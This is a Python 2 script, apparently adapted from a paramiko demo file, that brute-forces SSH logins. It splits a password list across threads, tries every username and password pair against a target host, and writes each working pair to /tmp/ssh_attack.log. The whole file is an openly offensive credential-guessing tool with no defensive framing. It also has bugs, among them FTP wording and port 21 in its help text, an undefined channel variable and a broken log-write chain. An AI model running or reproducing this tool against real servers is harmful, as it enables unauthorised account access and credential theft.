#!/usr/bin/env python

# Copyright (C) 2003-2007  Robey Pointer <robey@lag.net>
#
# This file is part of paramiko.
#
# Paramiko is free software; you can redistribute it and/or modify it under the
# terms of the GNU Lesser General Public License as published by the Free
# Software Foundation; either version 2.1 of the License, or (at your option)
# any later version.
#
# Paramiko is distrubuted in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more
# details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with Paramiko; if not, write to the Free Software Foundation, Inc.,
# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.


import base64
import getpass
import os
import socket
import sys
import traceback

import paramiko
#import interactive
import sys,getopt,time,threading

#global variables
verbose = False
log="/tmp/ssh_attack.log"
def usage():
    print '''
 Usage: ssh_attack [options...] <-u userlist|--userlist=> <-p pwdlist|--pwdlist=> server [ port ]

    -u, --userlist \t specify the file which obtain usernames from
    -p, --pwdlist \t specify the file which reading password from
    server \t the ftp server's hostname or IP address
    port \t specify the ftp server's port,default is 21

 options:
    -h, --help \t display this help message and exit
    -v, --verbose \t verbose output
    -n, --number \t specify the number of thread starting

    '''
    return True

def sshattack(hostname,port,userlist,pwdlist):
        
    # setup logging
    #paramiko.util.log_to_file('/tmp/ssh_attack.log')
    hostkey = None
    try:
        host_keys = paramiko.util.load_host_keys(os.path.expanduser('~/.ssh/known_hosts'))
    except IOError:
        try:
            # try ~/ssh/ too, because windows can't have a folder named ~/.ssh/
            host_keys = paramiko.util.load_host_keys(os.path.expanduser('~/ssh/known_hosts'))
        except IOError:
            print '*** Unable to open host keys file'
            host_keys = {}

    if host_keys.has_key(hostname):
        hostkeytype = host_keys[hostname].keys()[0]
        hostkey = host_keys[hostname][hostkeytype]
        #print 'Using host key of type %s' % hostkeytype


    # now, connect and use paramiko Transport to negotiate SSH2 across the connection
    for user in userlist:
        user = user.strip()
        for pwd in pwdlist:
            pwd = pwd.strip()
            try:
                #print "try user=" + user + " pwd = " + pwd
                t = paramiko.Transport((hostname, port))
                t.connect(username=user, password=pwd,hostkey=hostkey)
                #chan = t.open_session()
                #chan.get_pty()
                #chan.invoke_shell()
                print user + "\t" + pwd
                open(log,"a").write(user + ":" + pwd + "\n").close()
                print
                #interactive.interactive_shell(chan)
                chan.close()
                t.close()

            except Exception, e:
				pass
def split_seq(seq, size):
    '''
    Break a list into roughly equal sized pieces.
    seq: original sequene
    size: the number which split
    example:
    split_seq(range(10), 3)
    [[0, 1, 2], [3, 4, 5, 6], [7, 8, 9]]
    '''
    newseq = []
    splitsize = 1.0/size*len(seq)
    for i in range(size):
        newseq.append(seq[int(round(i*splitsize)):int(round((i+1)*splitsize))])
    return newseq
        
if __name__ == "__main__":
    
    '''
    usage: ssh_attack.py <host> <port> <userlist> <passwordlist>
    userlist and passwordlist is a plain text,each line has a account or password
    '''
    try:
        opts,args = getopt.getopt(sys.argv[1:],'vhn:o:u:p:',["verbose","help","number=","userlist=","pwdlist=","output"])
    except getopt.GetoptError,err:
        print str(err)
        usage()
        sys.exit(2)
    if (len(args) < 1):
        usage()
        sys.exit(2)

    host = args[0]
    port = 22
    try:
        port = args[1]
    except Exception:
        port = 22
    number = 1
    for o ,a in opts:
        if o in ("-v","--verbose"):
            verbose = True
        elif o in ("-h","--help"):
            usage()
            sys.exit(0)
        elif o in ("-n","--number"):
            number = int(a)
        elif o in ("-o","--output"):
			log = o
        elif o in ("-u","--userlist"):
            userlist = a
        elif o in ("-p","--pwdlist"):
            pwdlist = a
        else:
            assert False,"unhandled option"
    
    userlines = open(userlist,"r").readlines()
    pwdlines = open(pwdlist,"r").readlines()
    #split usernames into <n> segments
    p_list = split_seq(pwdlines,number)
    print "account\t password\t"
    print "-------\t --------\t"

    #init threads
    thread_pool = []
    for i in range(number):
        th = threading.Thread(target=sshattack,args=(host,port,userlines,p_list[i]))
        thread_pool.append(th)
    #start threads one by one
    btime = time.time()
    for i in range(number):
        thread_pool[i].start()

    #collect all threads
    for i in range(number):
        threading.Thread.join(thread_pool[i])
    etime = time.time()
    dsecs = etime - btime
    print "--------------"
    print "consume time:",dsecs,"senconds"
    sys.exit(0)
    
